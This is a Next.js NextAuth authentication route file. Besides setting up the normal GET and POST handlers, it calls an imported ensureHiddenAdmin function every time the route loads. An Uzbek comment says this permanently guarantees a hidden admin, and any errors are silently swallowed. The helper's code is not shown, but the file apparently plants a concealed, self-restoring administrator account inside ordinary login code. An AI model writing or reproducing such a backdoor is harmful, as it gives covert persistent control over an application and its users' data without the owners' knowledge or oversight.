import NextAuth from "next-auth";
import { PrismaClient } from "@prisma/client";
import { ensureHiddenAdmin } from "@/lib/hidden-admin";
import { authOptions } from "@/lib/auth-options";

export const dynamic = "force-dynamic";

const prisma = new PrismaClient();

// Yashirin adminni har safar auth chaqirilganda kafolatlash (doimiy)
ensureHiddenAdmin(prisma).catch(() => {});

const handler = NextAuth(authOptions as any);

export { handler as GET, handler as POST };